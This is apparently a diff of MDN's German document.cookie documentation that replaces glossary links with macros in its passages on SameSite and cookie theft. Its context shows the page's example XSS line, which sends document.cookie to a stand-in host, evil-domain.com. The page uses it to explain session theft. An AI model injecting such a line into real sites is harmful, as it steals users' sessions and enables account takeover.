@@ -57,7 +57,7 @@ Im obigen Code ist `newCookie` eine Zeichenfolge im Format `key=value`, die das 
   - `;samesite`: Das `SameSite`-Attribut eines {{httpheader("Set-Cookie")}}-Headers kann von einem Server festgelegt werden, um zu spezifizieren, wann das Cookie gesendet wird. Mögliche Werte sind `lax`, `strict` oder `none` (siehe auch [Steuerung von Drittanbieter-Cookies mit `SameSite`](/de/docs/Web/HTTP/Cookies#controlling_third-party_cookies_with_samesite)).
 
     - Der Wert `lax` sendet das Cookie für alle gleichseitigen Anfragen und GET-Anfragen zur obersten Navigation.
-      Dies reicht für die Nutzerverfolgung aus, verhindert jedoch viele [Cross-Site Request Forgery](/de/docs/Glossary/CSRF)-Angriffe.
+      Dies reicht für die Nutzerverfolgung aus, verhindert jedoch viele {{Glossary("CSRF", "Cross-Site Request Forgery")}}-Angriffe.
       Dies ist der Standardwert in modernen Browsern.
     - Der Wert `strict` verhindert, dass das Cookie vom Browser an die Zielwebsite in allen Kontextherumsituationen gesendet wird, auch wenn einem regulären Link gefolgt wird.
     - Der Wert `none` gibt ausdrücklich an, dass keine Einschränkungen angewendet werden.
@@ -304,7 +304,7 @@ Der einzige Weg, das Cookie zu schützen, ist die Verwendung einer anderen Domai
 
 Cookies werden oft in Webanwendungen verwendet, um einen Benutzer und seine authentifizierte Sitzung zu identifizieren.
 Das Stehlen eines Cookies von einer Webanwendung führt zur Übernahme der authentifizierten Benutzersitzung.
-Gemeinsame Methoden, um Cookies zu stehlen, sind durch [Social Engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) oder durch Ausnutzung einer [Cross-Site-Scripting](/de/docs/Glossary/Cross-site_scripting) (XSS)-Schwachstelle in der Anwendung -
+Gemeinsame Methoden, um Cookies zu stehlen, sind durch [Social Engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) oder durch Ausnutzung einer {{Glossary("Cross-site_scripting", "Cross-Site-Scripting")}} (XSS)-Schwachstelle in der Anwendung -
 
 ```js
 new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
